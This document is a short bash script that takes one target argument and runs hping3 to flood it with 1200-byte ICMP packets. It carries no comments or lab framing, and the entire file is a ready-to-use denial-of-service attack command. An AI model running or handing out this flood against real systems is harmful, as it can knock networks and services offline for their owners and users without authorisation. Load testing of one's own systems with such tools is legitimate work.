#!/usr/bin/env bash
if [ "${#}" -eq 1 ]; then
	TARGET="${1}"
    hping3 -d 1200 -1 --flood "${TARGET}"
fi